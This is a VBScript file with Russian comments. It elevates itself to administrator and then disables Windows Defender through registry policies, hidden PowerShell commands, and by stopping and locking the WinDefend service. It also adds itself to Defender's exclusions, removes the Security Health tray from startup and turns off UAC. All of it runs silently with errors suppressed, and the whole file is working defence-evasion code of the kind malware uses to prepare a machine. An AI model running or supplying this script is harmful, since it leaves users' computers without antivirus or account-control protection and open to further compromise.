' Запрос прав администратора
If Not WScript.Arguments.Named.Exists("elevate") Then
    CreateObject("Shell.Application").ShellExecute WScript.FullName _
        , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
    WScript.Quit
End If

On Error Resume Next ' Пропускать ошибки и продолжать выполнение

Set WshShell = CreateObject("WScript.Shell")

' 1. Отключение Windows Defender через реестр
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", 1, "REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection", 1, "REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable", 1, "REG_DWORD"

' 2. Отключение Windows Defender через PowerShell
outputMessage("Set-MpPreference -DisableRealtimeMonitoring $true")
outputMessage("Set-MpPreference -DisableBehaviorMonitoring $true")
outputMessage("Set-MpPreference -DisableBlockAtFirstSeen $true")
outputMessage("Set-MpPreference -DisableIOAVProtection $true")
outputMessage("Set-MpPreference -DisableScriptScanning $true")
outputMessage("Set-MpPreference -SubmitSamplesConsent 2")
outputMessage("Set-MpPreference -MAPSReporting 0")
outputMessage("Set-MpPreference -HighThreatDefaultAction 6 -Force")
outputMessage("Set-MpPreference -ModerateThreatDefaultAction 6")
outputMessage("Set-MpPreference -LowThreatDefaultAction 6")
outputMessage("Set-MpPreference -SevereThreatDefaultAction 6")

' 3. Добавление скрипта в исключения Windows Defender
scriptPath = WScript.ScriptFullName
outputMessage("Add-MpPreference -ExclusionPath """ & scriptPath & """")

' 4. Удаление SecurityHealthSystray из автозагрузки через реестр
WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SecurityHealth"
WshShell.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SecurityHealth"

' 5. Отключение UAC (Контроль учетных записей)
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD"

' 6. Остановка и отключение службы Windows Defender
Set objService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set colServices = objService.ExecQuery("Select * from Win32_Service where Name = 'WinDefend'")
For Each objService in colServices
    objService.StopService()
    objService.ChangeStartMode("Disabled")
Next

' 7. Блокировка повторного запуска службы
WshShell.RegWrite "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend\Start", 4, "REG_DWORD"

' Функция для выполнения команд PowerShell
Sub outputMessage(byval args)
    On Error Resume Next
    Set objShell = CreateObject("Wscript.shell")
    objShell.run("powershell -Command " & args), 0
End Sub